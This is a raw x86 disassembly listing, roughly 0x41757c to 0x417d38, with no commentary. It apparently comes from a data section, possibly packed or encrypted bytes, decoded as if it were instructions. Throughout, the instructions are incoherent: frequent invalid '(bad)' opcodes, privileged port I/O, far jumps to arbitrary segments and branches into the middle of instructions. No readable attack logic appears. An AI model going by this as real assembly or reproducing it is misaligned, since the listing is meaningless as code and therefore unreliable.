  41757c:	xor    bh,al
  41757e:	sub    eax,0xf5adc344
  417583:	inc    ebp
  417584:	jo     0x4175b7
  417586:	sbb    esi,edx
  417588:	stos   BYTE PTR es:[edi],al
  417589:	aaa    
  41758a:	cld    
  41758b:	inc    ebp
  41758c:	ret    
  41758d:	mov    ch,0x52
  41758f:	hlt    
  417590:	mov    ch,0x31
  417592:	outs   dx,DWORD PTR ds:[esi]
  417593:	sbb    DWORD PTR [eax],edx
  417595:	mov    ecx,0xc65e4cf7
  41759a:	or     esi,DWORD PTR [edx]
  41759c:	jg     0x417579
  41759e:	imul   ecx,DWORD PTR [eax+0x270c12d5],0x13
  4175a5:	mov    esi,0xef374fdc
  4175aa:	lods   eax,DWORD PTR ds:[esi]
  4175ab:	mov    al,bh
  4175ad:	mov    cx,WORD PTR [ebp-0x719c70e1]
  4175b4:	aaa    
  4175b5:	outs   dx,BYTE PTR ds:[esi]
  4175b6:	fbstp  TBYTE PTR ds:0xe4c12ee6
  4175bc:	mov    edi,0x5d87a733
  4175c1:	xchg   ebp,eax
  4175c2:	in     al,0xfe
  4175c4:	adc    ah,BYTE PTR [edx]
  4175c6:	jge    0x4175d6
  4175c8:	mov    dl,0xed
  4175ca:	fsub   DWORD PTR [ecx+edx*2+0x46902814]
  4175d1:	jge    0x417599
  4175d3:	(bad)  
  4175d5:	mul    DWORD PTR [edi-0x7a]
  4175d8:	out    0xe5,eax
  4175da:	sbb    DWORD PTR [ebx-0x6f],0x35
  4175de:	xchg   esp,eax
  4175df:	ret    
  4175e0:	pop    ss
  4175e1:	outs   dx,BYTE PTR ds:[esi]
  4175e2:	add    DWORD PTR [ebx+esi*2-0x3b3c1d7c],esi
  4175e9:	sub    al,BYTE PTR [esi]
  4175eb:	jle    0x41763e
  4175ed:	xchg   ebx,eax
  4175ee:	pop    eax
  4175ef:	(bad)
  4175f2:	das    
  4175f3:	outs   dx,BYTE PTR ds:[esi]
  4175f4:	test   al,0xd4
  4175f6:	lods   eax,DWORD PTR ds:[esi]
  4175f7:	xor    eax,DWORD PTR [ecx+0x2e]
  4175fa:	cli    
  4175fb:	icebp  
  4175fc:	sub    ebx,esp
  4175fe:	push   esp
  4175ff:	mov    ds:0x4f981525,eax
  417604:	pop    esi
  417605:	(bad)  
  417606:	pushf  
  417607:	out    0x2c,eax
  417609:	stos   DWORD PTR es:[edi],eax
  41760a:	mov    ebx,0x61edb43
  41760f:	lods   al,BYTE PTR ds:[esi]
  417610:	mov    bl,0x4
  417612:	mov    eax,ds:0xa738858a
  417617:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417618:	sbb    ebp,esp
  41761a:	test   DWORD PTR [ebx+0x6a8e922a],ecx
  417620:	mov    esp,0xb32b6588
  417625:	in     eax,0xf9
  417627:	loope  0x417615
  417629:	adc    ebx,DWORD PTR [ecx-0x205fe030]
  41762f:	scas   al,BYTE PTR es:[edi]
  417630:	in     al,0x84
  417632:	adc    DWORD PTR [ecx+0x1389e4f8],edx
  417638:	es into 
  41763a:	daa    
  41763b:	shl    DWORD PTR [eax+0x552b5262],cl
  417641:	or     eax,0x3a29d3a2
  417646:	push   ebx
  417647:	lea    ecx,[edi+0x595bd246]
  41764d:	je     0x417630
  41764f:	jecxz  0x41766e
  417651:	sbb    BYTE PTR [ebp+0x98a7613],cl
  417657:	xchg   ebp,eax
  417658:	add    BYTE PTR [eax],bl
  41765a:	fs in  al,dx
  41765c:	mov    ch,0x39
  41765e:	dec    edx
  41765f:	pop    esp
  417660:	js     0x417679
  417662:	in     eax,dx
  417663:	add    ebp,ecx
  417665:	daa    
  417666:	mov    al,ds:0x8f768c02
  41766b:	nop
  41766c:	cmp    eax,ecx
  41766e:	cs dec edx
  417670:	and    BYTE PTR [edi-0x14],ah
  417673:	iret   
  417674:	pushf  
  417675:	jns    0x417682
  417677:	sub    cl,BYTE PTR [ebp-0x14]
  41767a:	mov    ebp,0xaf2168d9
  41767f:	or     ebp,DWORD PTR [edi]
  417681:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417682:	mov    bh,0xe
  417684:	adc    DWORD PTR [ebp-0x26],edi
  417687:	stos   DWORD PTR es:[edi],eax
  417688:	retf   
  417689:	push   0x7
  41768b:	mov    eax,ds:0xe1eb0c2b
  417690:	xchg   esi,eax
  417691:	or     DWORD PTR [eax-0x38],ecx
  417694:	cmp    eax,0xd31eb3b2
  417699:	jmp    0xcddbfc3
  41769e:	dec    eax
  41769f:	sbb    eax,DWORD PTR ds:0x4cad54ac
  4176a5:	xchg   ecx,eax
  4176a6:	mov    edx,0x1d237964
  4176ab:	add    ebp,DWORD PTR [edx-0xd]
  4176ae:	pop    esi
  4176af:	add    ch,BYTE PTR [ebp+0x60c86393]
  4176b5:	xor    ecx,DWORD PTR [esi-0xc151525]
  4176bb:	add    ecx,DWORD PTR [ebp+0x437f5aff]
  4176c1:	adc    esi,DWORD PTR [ebp-0x4da6766d]
  4176c7:	ins    DWORD PTR es:[edi],dx
  4176c8:	or     ch,0x92
  4176cb:	inc    eax
  4176cc:	mov    ds:0xe4b46e19,eax
  4176d1:	adc    al,0xb2
  4176d3:	fnstcw WORD PTR ds:0xbaff4b22
  4176d9:	xchg   esi,eax
  4176da:	and    eax,0x639d32e2
  4176df:	ret    0xc031
  4176e2:	daa    
  4176e3:	inc    edx
  4176e4:	add    bh,ah
  4176e6:	jge    0x41769c
  4176e8:	sbb    eax,0xf1cab407
  4176ed:	mov    dh,0xa5
  4176ef:	rcl    dl,1
  4176f1:	popa   
  4176f2:	jg     0x4176ef
  4176f4:	and    DWORD PTR [esi],esi
  4176f6:	push   edx
  4176f7:	jbe    0x41774f
  4176f9:	jg     0x4176a7
  4176fb:	ds out dx,eax
  4176fd:	xchg   DWORD PTR [ebp-0x1c],eax
  417700:	or     bl,BYTE PTR [eax-0x5f]
  417703:	xlat   BYTE PTR ds:[ebx]
  417704:	sub    cl,BYTE PTR [edi-0x1a]
  417707:	loop   0x41770c
  417709:	out    0x6f,al
  41770b:	scas   eax,DWORD PTR es:[edi]
  41770c:	xchg   esp,eax
  41770d:	js     0x41773c
  41770f:	test   eax,0xf4dad45f
  417714:	or     BYTE PTR [edx+eiz*4],al
  417717:	scas   al,BYTE PTR es:[edi]
  417718:	pop    ds
  417719:	scas   al,BYTE PTR es:[edi]
  41771a:	mov    ds:0x4c3a9660,al
  41771f:	lds    esi,FWORD PTR [ebx+0x5d]
  417722:	mov    eax,0xc1b07bcd
  417727:	out    0x9d,eax
  417729:	inc    ebp
  41772a:	adc    DWORD PTR [esi+edx*8],eax
  41772d:	inc    eax
  41772e:	aad    0x9
  417730:	retf   
  417731:	lahf   
  417732:	pop    ebx
  417733:	mov    al,ds:0xbed25d2a
  417738:	hlt    
  417739:	aaa    
  41773a:	or     bh,BYTE PTR [edx+0x74]
  41773d:	(bad)  
  41773e:	xchg   edx,eax
  41773f:	sti    
  417740:	mov    edi,0xd63054d4
  417745:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417746:	add    al,0xe5
  417748:	mov    ch,0x79
  41774a:	and    ecx,DWORD PTR [edx-0x2c]
  41774d:	pusha  
  41774e:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417750:	cmp    ah,BYTE PTR [ecx]
  417752:	push   eax
  417753:	ja     0x417725
  417755:	sahf   
  417756:	dec    BYTE PTR ds:0x1cc777d8
  41775c:	adc    eax,0x51ef8563
  417761:	jge    0x4177c4
  417763:	inc    edi
  417764:	cwde   
  417765:	push   edi
  417766:	mov    ch,0x8c
  417768:	add    BYTE PTR [esi],dl
  41776a:	push   0xffffffc9
  41776c:	xor    dl,BYTE PTR [eax]
  41776e:	ret    0x1e1a
  417771:	sub    DWORD PTR [ebx-0x6e2eec93],ebp
  417777:	push   DWORD PTR [ecx]
  417779:	mov    bh,0x90
  41777b:	imul   edi,DWORD PTR [edx+ebx*4],0x81e207ce
  417782:	lds    edi,FWORD PTR [ebp*4-0x5a86651f]
  417789:	test   al,0x29
  41778b:	cwde   
  41778c:	push   edi
  41778d:	lods   al,BYTE PTR ds:[esi]
  41778e:	or     eax,0x4e464cd1
  417793:	lds    ebx,FWORD PTR [edi+0x4c]
  417796:	xchg   edi,eax
  417797:	mov    ch,0xa
  417799:	pop    ss
  41779a:	enter  0xf4c6,0x78
  41779e:	inc    esp
  41779f:	sbb    ebp,DWORD PTR [edx]
  4177a1:	sub    dh,BYTE PTR [esi+edi*4+0x4bf779e1]
  4177a8:	jp     0x4177cf
  4177aa:	repz inc ecx
  4177ac:	mov    dl,0x48
  4177ae:	xor    al,dl
  4177b0:	jno    0x4177f1
  4177b2:	(bad)  
  4177b3:	cwde   
  4177b4:	addr16 pop ebx
  4177b6:	mov    eax,ds:0xe93e7bc8
  4177bb:	dec    ecx
  4177bc:	inc    edx
  4177bd:	jl     0x41781c
  4177bf:	rcr    BYTE PTR [esi+ecx*1-0x31587f9b],cl
  4177c6:	jne    0x4177e8
  4177c8:	push   esi
  4177c9:	push   es
  4177ca:	in     al,dx
  4177cb:	mov    ah,BYTE PTR [edx+0x4e]
  4177ce:	fwait
  4177cf:	(bad)  
  4177d0:	(bad)  
  4177d1:	jl     0x417794
  4177d3:	js     0x4177bc
  4177d5:	pop    ebx
  4177d6:	rcr    ch,0x9b
  4177d9:	cmp    ebp,DWORD PTR [eax-0x2c84f951]
  4177df:	jns    0x417849
  4177e1:	mov    ds:0xfae165a3,eax
  4177e6:	mov    ch,0x72
  4177e8:	xor    al,0x42
  4177ea:	(bad)  
  4177eb:	out    0x1b,eax
  4177ed:	mov    ch,0xba
  4177ef:	cmp    bl,BYTE PTR ds:0x57afc6d2
  4177f5:	imul   ebx,DWORD PTR [edx+0x62],0xfffffffc
  4177f9:	pop    esp
  4177fa:	adc    BYTE PTR [eax-0x4c],dl
  4177fd:	mov    dh,0x74
  4177ff:	int3   
  417800:	daa    
  417801:	mov    esi,0x34b97c40
  417806:	sbb    al,0x60
  417808:	jg     0x4177bc
  41780a:	in     eax,0xdf
  41780c:	push   esi
  41780d:	sbb    esi,0x1f
  417810:	mov    WORD PTR [ecx-0xa220698],ds
  417816:	mov    dh,0xe4
  417818:	dec    eax
  417819:	dec    esp
  41781a:	cmc    
  41781b:	out    0xe0,al
  41781d:	call   0xfef1052d
  417822:	test   DWORD PTR [ebx],ebp
  417824:	inc    ecx
  417825:	mov    al,ds:0x9cd627a7
  41782a:	fcmovbe st,st(1)
  41782c:	jne    0x4177b1
  41782e:	fbstp  TBYTE PTR [edi-0x36]
  417831:	sbb    ebp,DWORD PTR [edi]
  417833:	sub    eax,DWORD PTR [esi-0xf]
  417836:	push   es
  417837:	adc    BYTE PTR [eax-0x1a],ah
  41783a:	je     0x41789f
  41783c:	push   es
  41783d:	xor    al,0x64
  41783f:	addr16 pop ecx
  417841:	lahf   
  417842:	push   esi
  417843:	inc    ebp
  417844:	dec    edi
  417845:	or     ebp,0x60f6248f
  41784b:	sub    BYTE PTR [ebp+eiz*8-0x28],dl
  41784f:	mov    edi,0x50d3c29e
  417854:	add    al,0x3b
  417856:	in     eax,0x3c
  417858:	in     eax,0x2b
  41785a:	xor    edx,DWORD PTR [ebx-0x9]
  41785d:	jp     0x4178cf
  41785f:	dec    ecx
  417860:	mov    dl,BYTE PTR [edi-0x719fb5cf]
  417866:	push   cs
  417867:	cmc    
  417868:	ss jge 0x417876
  41786b:	and    eax,0xabd02a75
  417870:	mov    cl,0x35
  417872:	es dec esi
  417874:	outs   dx,BYTE PTR ds:[esi]
  417875:	mov    ebp,0x14e6bef0
  41787a:	sar    DWORD PTR [ebx+0x17a656d1],1
  417880:	lods   al,BYTE PTR ds:[esi]
  417881:	ds jmp 0x417851
  417884:	mov    ds:0xb55b44a2,eax
  417889:	aam    0x1c
  41788b:	fldcw  WORD PTR [ebx-0x48]
  41788e:	mov    bl,0x98
  417890:	mov    eax,0xc0147018
  417895:	in     al,dx
  417896:	cmp    cl,ah
  417898:	add    ch,BYTE PTR [ecx+0x70]
  41789b:	hlt    
  41789c:	pop    esp
  41789d:	push   ebp
  41789e:	add    al,0x8f
  4178a0:	fsub   DWORD PTR [ebp+0x72]
  4178a3:	out    dx,al
  4178a4:	lea    esp,[ecx]
  4178a6:	loop   0x4178ec
  4178a8:	jp     0x41784f
  4178aa:	je     0x4178d1
  4178ac:	retf   0xcf18
  4178af:	test   DWORD PTR [eax-0xcfe354],edi
  4178b5:	xchg   BYTE PTR [ecx+ecx*1-0x3b50cf7f],bh
  4178bc:	sbb    BYTE PTR [edi],dl
  4178be:	loope  0x4178fb
  4178c0:	mov    edi,0x11f937f5
  4178c5:	es repz dec ebx
  4178c8:	push   esi
  4178c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4178ca:	and    eax,0xdd3ae0f7
  4178cf:	adc    ebp,esp
  4178d1:	fisub  WORD PTR [edi]
  4178d3:	lahf   
  4178d4:	xchg   BYTE PTR [ecx],dl
  4178d6:	mov    ch,cl
  4178d8:	into   
  4178d9:	je     0x417945
  4178db:	push   ecx
  4178dc:	test   BYTE PTR [bx+di+0x6e],dl
  4178e0:	push   cs
  4178e1:	stos   BYTE PTR es:[edi],al
  4178e2:	imul   DWORD PTR [ebp+eax*4+0x40d9c99d]
  4178e9:	mov    ebp,ebp
  4178eb:	lods   al,BYTE PTR ds:[esi]
  4178ec:	or     ah,ch
  4178ee:	(bad)  
  4178ef:	sub    DWORD PTR [ebp-0x50180f3c],edi
  4178f5:	retf   
  4178f6:	sar    BYTE PTR [edi-0x3b],1
  4178f9:	add    al,0x79
  4178fb:	adc    esi,edi
  4178fd:	aam    0x73
  4178ff:	ret    0xd4b0
  417902:	pop    eax
  417903:	cmp    bh,cl
  417905:	xchg   DWORD PTR [edi],esi
  417907:	inc    BYTE PTR [eax+0x23]
  41790a:	mov    ch,0xdd
  41790c:	mov    edx,0xbe06ef77
  417911:	stc    
  417912:	sbb    BYTE PTR [esi+0x299a31fa],ch
  417918:	fwait
  417919:	push   esp
  41791a:	or     ah,BYTE PTR ds:0xe3e37d2e
  417920:	push   cs
  417921:	dec    ebx
  417922:	dec    esp
  417923:	in     eax,dx
  417924:	mov    cs,WORD PTR [edi]
  417926:	mov    al,ds:0xa2e30248
  41792b:	mov    eax,ds:0xa010c248
  417930:	mov    gs,WORD PTR [ebp-0x68d444be]
  417936:	mov    ebp,0x8d43e71a
  41793b:	jb     0x417978
  41793d:	cli    
  41793e:	js     0x4178c3
  417940:	sti    
  417941:	mov    eax,0xe162c6dc
  417946:	test   al,0x51
  417948:	add    BYTE PTR [edx+0x5167a543],ch
  41794e:	sbb    esi,esp
  417950:	mov    ebp,0x36f58e1
  417955:	cmc    
  417956:	jnp    0x4178e6
  417958:	mov    bl,0x71
  41795a:	(bad)  [eax+0x59]
  41795d:	jae    0x4178f0
  41795f:	ins    DWORD PTR es:[edi],dx
  417960:	retf   0x1010
  417963:	shl    edx,1
  417965:	push   edx
  417966:	jmp    0x417957
  417968:	xchg   edi,eax
  417969:	aaa    
  41796a:	imul   ecx,esp,0x62
  41796d:	push   0x93ebb7d6
  417972:	inc    edi
  417973:	or     eax,0x3ef232ee
  417978:	pop    ecx
  417979:	xchg   ebp,eax
  41797a:	sub    edi,ebx
  41797c:	mov    bl,BYTE PTR [edx+0x4a]
  41797f:	cld    
  417980:	(bad)  
  417981:	aam    0xbe
  417983:	ins    DWORD PTR es:[edi],dx
  417984:	shufps xmm2,XMMWORD PTR [esi+0x1e1ce6b3],0x82
  41798c:	into   
  41798d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41798e:	std    
  41798f:	les    edi,FWORD PTR [esi+0x4b62f446]
  417995:	psubd  mm3,QWORD PTR [ebx+ebx*4]
  417999:	sub    BYTE PTR [edx+0x3f],ah
  41799c:	das    
  41799d:	cdq    
  41799e:	xor    BYTE PTR [ecx],cl
  4179a0:	call   0x4aa13bab
  4179a5:	push   edi
  4179a6:	adc    ch,dh
  4179a8:	sbb    DWORD PTR [ebx],0x17231d4f
  4179ae:	cmp    al,0x45
  4179b0:	sbb    eax,0x407291c2
  4179b5:	sub    al,BYTE PTR [edx]
  4179b7:	cmp    DWORD PTR [ecx-0x6a],eax
  4179ba:	push   ecx
  4179bb:	(bad)  
  4179bc:	sti    
  4179bd:	pusha  
  4179be:	push   eax
  4179bf:	push   cs
  4179c0:	mov    al,ds:0x5da5d6fe
  4179c5:	pop    edi
  4179c6:	sahf   
  4179c7:	pop    edx
  4179c8:	xor    cl,ch
  4179ca:	bound  edi,QWORD PTR [eax*4-0x6754cb09]
  4179d1:	ret    
  4179d2:	sbb    cl,BYTE PTR [eax-0x32]
  4179d5:	pop    ebx
  4179d6:	mov    ds,WORD PTR [ebx]
  4179d8:	inc    ebp
  4179d9:	mov    ebx,0xcfe6b1ca
  4179de:	mov    ebp,0xe1453a65
  4179e3:	rol    esp,0x21
  4179e6:	(bad)  
  4179e7:	mov    esi,0x49d3ecfa
  4179ec:	jecxz  0x417a51
  4179ee:	pushf  
  4179ef:	mov    bh,BYTE PTR [ebx+0x16]
  4179f2:	imul   edi,DWORD PTR [ebx],0xffffffc3
  4179f5:	add    BYTE PTR [ecx-0x39ad8f39],al
  4179fb:	sbb    DWORD PTR [ebx-0x72],edx
  4179fe:	inc    eax
  4179ff:	pusha  
  417a00:	sub    al,0xeb
  417a02:	push   ecx
  417a03:	inc    edi
  417a04:	fwait
  417a05:	xchg   BYTE PTR [edi+0x29da1b16],ch
  417a0b:	lock test eax,0xa9b58c76
  417a11:	push   ss
  417a12:	push   ss
  417a13:	mov    bh,0x48
  417a15:	cmp    BYTE PTR [eax+0x6b],0xa7
  417a19:	sub    al,0xb2
  417a1b:	dec    bx
  417a1d:	jae    0x417a4c
  417a1f:	xchg   cl,dh
  417a21:	ins    BYTE PTR es:[edi],dx
  417a22:	mov    esp,0x6823d850
  417a27:	in     eax,dx
  417a28:	mov    edx,0x7dd43697
  417a2d:	dec    ecx
  417a2e:	add    al,0x55
  417a30:	inc    ebp
  417a31:	ja     0x4179d4
  417a33:	iret   
  417a34:	add    DWORD PTR [esi+edx*2-0x15],esp
  417a38:	shl    ebp,1
  417a3a:	mov    WORD PTR [ecx+0x6ddf178b],fs
  417a40:	sti    
  417a41:	dec    edx
  417a42:	pop    ds
  417a43:	out    dx,al
  417a44:	mov    eax,ds:0xa1b97a1a
  417a49:	retfw  
  417a4b:	sub    bh,BYTE PTR ds:0x7f8d02e6
  417a51:	rcr    bh,0xd6
  417a54:	sbb    ch,bl
  417a56:	inc    edx
  417a57:	(bad)
  417a5a:	ret    
  417a5b:	pop    ebx
  417a5c:	iret   
  417a5d:	pop    ds
  417a5e:	mov    ds:0xce7c79b7,eax
  417a63:	lods   al,BYTE PTR ds:[esi]
  417a64:	aam    0x85
  417a66:	mov    edi,0x882d6d45
  417a6b:	aam    0x2e
  417a6d:	test   DWORD PTR [edx+ebx*4-0x76eaf030],ebp
  417a74:	ja     0x417ace
  417a76:	jle    0x417af7
  417a78:	mov    ch,0x5d
  417a7a:	add    dl,al
  417a7c:	call   0xb4eb:0x9013265a
  417a83:	fcmovne st,st(2)
  417a85:	enter  0x76eb,0xdb
  417a89:	std    
  417a8a:	mov    edx,DWORD PTR [eax+0x28f5b3d3]
  417a90:	cdq    
  417a91:	leave  
  417a92:	loop   0x417a63
  417a94:	retf   
  417a95:	stc    
  417a96:	mov    dl,BYTE PTR ds:0x674d31d4
  417a9c:	inc    esp
  417a9d:	data16 add al,0xeb
  417aa0:	retf   
  417aa1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417aa2:	jge    0x417b1a
  417aa4:	repnz out 0x7f,al
  417aa7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417aa8:	mov    al,0x80
  417aaa:	pushf  
  417aab:	mul    esp
  417aad:	push   0x33fe5c0b
  417ab2:	jo     0x417aaf
  417ab4:	mov    ecx,DWORD PTR [eax+0x1a684344]
  417aba:	ins    DWORD PTR es:[edi],dx
  417abb:	push   cs
  417abc:	xor    DWORD PTR [eax-0x37844855],eax
  417ac2:	push   es
  417ac3:	pop    esi
  417ac4:	push   es
  417ac5:	dec    edx
  417ac6:	push   0x61d84174
  417acb:	pop    ecx
  417acc:	mov    ecx,0x7d5f7576
  417ad1:	(bad)  
  417ad2:	ins    DWORD PTR es:[edi],dx
  417ad3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417ad4:	mov    ah,0xe5
  417ad6:	sbb    ch,al
  417ad8:	mov    DWORD PTR [esi+ebx*4],ecx
  417adb:	neg    DWORD PTR [edi]
  417add:	mov    ecx,0x5d9d35de
  417ae2:	jge    0x417aa8
  417ae4:	outs   dx,DWORD PTR ds:[esi]
  417ae5:	xchg   edi,eax
  417ae6:	mov    esi,0x77194bb6
  417aeb:	shr    DWORD PTR [ebp+edx*8+0x6f],1
  417aef:	jmp    0x417ae7
  417af1:	mov    DWORD PTR [esi+0x2a],edi
  417af4:	inc    edi
  417af5:	mov    WORD PTR [ecx-0x3d33d254],es
  417afb:	imul   ecx,edi,0x33a79736
  417b01:	ja     0x417b73
  417b03:	or     dh,ah
  417b05:	loope  0x417b0b
  417b07:	idiv   DWORD PTR [edx]
  417b09:	sbb    BYTE PTR [esi-0x15],al
  417b0c:	mov    eax,ds:0x66237275
  417b11:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417b12:	push   cs
  417b13:	xlat   BYTE PTR ds:[ebx]
  417b14:	addr16 add eax,0x9c8f8bc5
  417b1a:	lahf   
  417b1b:	add    eax,0xb7c0adb2
  417b20:	ret    
  417b21:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417b22:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417b23:	outs   dx,DWORD PTR ds:[esi]
  417b24:	int    0x43
  417b26:	or     al,0x65
  417b28:	enter  0x8d43,0xad
  417b2c:	fild   QWORD PTR [edi-0x4a]
  417b2f:	das    
  417b30:	push   0x18f33c0f
  417b35:	mov    al,ds:0x6cae0b80
  417b3a:	push   esi
  417b3b:	aam    0xd8
  417b3d:	cmp    eax,DWORD PTR [esi+0x3f8787ae]
  417b43:	arpl   WORD PTR [edi+0x31],bx
  417b46:	adc    al,0x6f
  417b48:	add    al,0xcf
  417b4a:	out    0x80,al
  417b4c:	out    0x9d,eax
  417b4e:	nop
  417b4f:	std    
  417b50:	pushf  
  417b51:	push   ds
  417b52:	cmp    edx,edx
  417b54:	shr    DWORD PTR [esi+0x60],1
  417b57:	jb     0x417b24
  417b59:	fstp   DWORD PTR [edx+0x73f5e1da]
  417b5f:	sbb    eax,0xed569cc7
  417b64:	lods   al,BYTE PTR ds:[esi]
  417b65:	es pusha 
  417b67:	xchg   DWORD PTR [ebx],esi
  417b69:	(bad)  
  417b6a:	je     0x417b36
  417b6c:	mov    WORD PTR [ebp-0x7168429e],ss
  417b72:	rcl    DWORD PTR [edx+0x1c89c744],0x6a
  417b79:	sbb    eax,0x18b1c543
  417b7e:	cmp    BYTE PTR [esi+0x2325c20a],bh
  417b84:	cmp    DWORD PTR [ecx],esp
  417b86:	(bad)  
  417b87:	jmp    0x9b87:0x7f4f48cd
  417b8e:	mov    ebx,DWORD PTR [ebp-0x6a21fc38]
  417b94:	scas   al,BYTE PTR es:[edi]
  417b95:	outs   dx,DWORD PTR ds:[esi]
  417b96:	xor    al,0x28
  417b98:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417b99:	jmp    0x417bbb
  417b9b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417b9c:	mov    ecx,0xeb6f59b
  417ba1:	data16 repz jmp 0x417ba4
  417ba5:	sbb    BYTE PTR [esi-0xb9dcec6],ah
  417bab:	xchg   edx,eax
  417bac:	daa    
  417bad:	ss xchg esp,eax
  417baf:	jmp    0xcb5cba7e
  417bb4:	into   
  417bb5:	es or  al,0x83
  417bb8:	mov    eax,ds:0xd94f4925
  417bbd:	mov    ebx,0x4959f3f
  417bc2:	sbb    ebp,ebx
  417bc4:	xor    BYTE PTR [eax],bl
  417bc6:	push   0x52158783
  417bcb:	ins    BYTE PTR es:[edi],dx
  417bcc:	sbb    BYTE PTR [ecx],0xf6
  417bcf:	pushf  
  417bd0:	cmc    
  417bd1:	loop   0x417c2e
  417bd3:	int    0xf5
  417bd5:	or     eax,0xee179bc7
  417bda:	xchg   ebx,eax
  417bdb:	mov    ch,0x6
  417bdd:	int    0x66
  417bdf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417be0:	cmp    ah,BYTE PTR [esi-0x452e5990]
  417be6:	push   ecx
  417be7:	xchg   ebx,eax
  417be8:	out    dx,eax
  417be9:	inc    eax
  417bea:	push   ss
  417beb:	pop    esp
  417bec:	je     0x417b92
  417bee:	mov    esp,0xf3225ddd
  417bf3:	leave  
  417bf4:	dec    DWORD PTR [edx-0x7727cee6]
  417bfa:	adc    eax,DWORD PTR [edx-0x43872885]
  417c00:	stc    
  417c01:	fwait
  417c02:	es in  eax,0x5d
  417c05:	dec    eax
  417c06:	and    esi,DWORD PTR [ebp+0x79]
  417c09:	imul   ebx,esi,0xffffff8c
  417c0c:	dec    edi
  417c0d:	cmp    esi,DWORD PTR [edx+0x64]
  417c10:	cmp    BYTE PTR [edx-0x11],cl
  417c13:	or     esi,DWORD PTR [esi]
  417c15:	cmc    
  417c16:	ds mov cl,0x48
  417c19:	mov    dl,0x8
  417c1b:	sbb    BYTE PTR [ebp+0x7bd09fd3],0xa3
  417c22:	ss xor bh,BYTE PTR fs:[ebp-0x2edcb57b]
  417c2a:	js     0x417c13
  417c2c:	ins    BYTE PTR es:[edi],dx
  417c2d:	leave  
  417c2e:	cmp    BYTE PTR [ebp+0x2f153fed],ch
  417c34:	sbb    eax,0x74dfb748
  417c39:	ficomp DWORD PTR [ecx]
  417c3b:	pop    esi
  417c3c:	cmp    bh,BYTE PTR [ebx]
  417c3e:	mov    ebx,0xa1ccf03a
  417c43:	lds    esi,FWORD PTR [ecx-0x76b3e76a]
  417c49:	call   0xb17:0xd33da479
  417c50:	sub    DWORD PTR [esi+0x3f],edi
  417c53:	(bad)  
  417c55:	or     eax,0x1b578d71
  417c5a:	mov    ds:0x602dcbfc,al
  417c5f:	or     esi,DWORD PTR [ecx-0x5a]
  417c62:	psllq  mm2,mm7
  417c65:	pop    ds
  417c66:	mov    esp,0xa77ef139
  417c6b:	les    esi,FWORD PTR [ebp-0x41752fb1]
  417c71:	stc    
  417c72:	mov    edx,0x7321f4f7
  417c77:	pop    esi
  417c78:	les    ebx,FWORD PTR [ebx-0x74525c64]
  417c7e:	pop    es
  417c7f:	shr    BYTE PTR [eax+0x151621df],1
  417c85:	fnstsw WORD PTR [edi+0x74bfae9f]
  417c8b:	cmc    
  417c8c:	cmp    ebx,DWORD PTR [edi]
  417c8e:	sahf   
  417c8f:	loop   0x417cc1
  417c91:	push   ds
  417c92:	loopne 0x417ce3
  417c94:	xor    eax,0xc0fa64d7
  417c99:	popf   
  417c9a:	add    BYTE PTR [edx-0x2e015fe3],al
  417ca0:	mov    esi,0x53edda7c
  417ca5:	loop   0x417d03
  417ca7:	jno    0x417cdc
  417ca9:	sub    DWORD PTR [ebx-0x357635ce],ecx
  417caf:	dec    cl
  417cb1:	dec    eax
  417cb2:	inc    eax
  417cb3:	pop    ecx
  417cb4:	jmp    0x1e19:0x658b3600
  417cbb:	stc    
  417cbc:	popf   
  417cbd:	inc    esp
  417cbe:	js     0x417d14
  417cc0:	or     al,0xa2
  417cc2:	push   cs
  417cc3:	cli    
  417cc4:	mov    ds,WORD PTR [eax+0x6e136a33]
  417cca:	ds fwait
  417ccc:	sbb    ch,BYTE PTR [esi+0x4d]
  417ccf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417cd0:	xchg   edx,eax
  417cd1:	cmp    al,0xd7
  417cd3:	dec    ebp
  417cd4:	(bad)  [ebx]
  417cd6:	jae    0x417cdd
  417cd8:	mov    ebp,0x794ef9d6
  417cdd:	jmp    0x417cac
  417cdf:	test   DWORD PTR [eax-0x46fdcc62],ebx
  417ce5:	push   cs
  417ce6:	dec    esi
  417ce7:	cli    
  417ce8:	cwde   
  417ce9:	enter  0xd26f,0x75
  417ced:	xor    dh,bh
  417cef:	push   es
  417cf0:	bnd jne 0x417cec
  417cf3:	mov    esp,0x55d33277
  417cf8:	scas   eax,DWORD PTR es:[edi]
  417cf9:	and    bl,al
  417cfb:	popa   
  417cfc:	sbb    eax,esi
  417cfe:	ja     0x417d6f
  417d00:	push   esi
  417d01:	daa    
  417d02:	pop    esi
  417d03:	cmp    ebx,DWORD PTR [esp+ecx*8+0x5bf393e0]
  417d0a:	das    
  417d0b:	scas   eax,DWORD PTR es:[edi]
  417d0c:	cmp    BYTE PTR [esi-0x16],ch
  417d0f:	push   ebp
  417d10:	in     eax,dx
  417d11:	xchg   edi,eax
  417d12:	cwde   
  417d13:	mov    ds,WORD PTR [ebx]
  417d15:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417d16:	cmp    DWORD PTR [ebx+edi*4],ebx
  417d19:	dec    ebp
  417d1a:	cmp    edi,DWORD PTR [ecx+ecx*8]
  417d1d:	xor    al,0x51
  417d1f:	js     0x417ca8
  417d21:	retf   
  417d22:	xor    BYTE PTR [ebx],cl
  417d24:	inc    ecx
  417d25:	fild   DWORD PTR [edx+0x19]
  417d28:	js     0x417cb0
  417d2a:	cwde   
  417d2b:	fist   DWORD PTR [edx-0x3a]
  417d2e:	(bad)  
  417d2f:	in     eax,0x56
  417d31:	xor    cl,dl
  417d33:	jmp    0x850b6895
  417d38:	out    0xb2,eax
